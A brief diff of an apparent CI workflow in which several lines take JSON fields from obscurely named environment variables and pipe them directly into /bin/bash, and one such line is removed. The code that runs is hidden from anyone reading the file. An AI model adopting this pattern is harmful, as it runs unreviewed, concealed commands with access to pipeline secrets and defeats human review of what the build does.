@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$ixsx392" | jq -r .tr3 | /bin/bash
           printf '%s' "$el35751" | jq -r .v49522 | /bin/bash
-          echo $cpl06532 | jq -r .ypth70 | /bin/bash
           printf '%s' "$yjb880" | jq -r .rnevt1 | /bin/bash
           echo $ntw77245 | jq -r .jq2 | /bin/bash
 
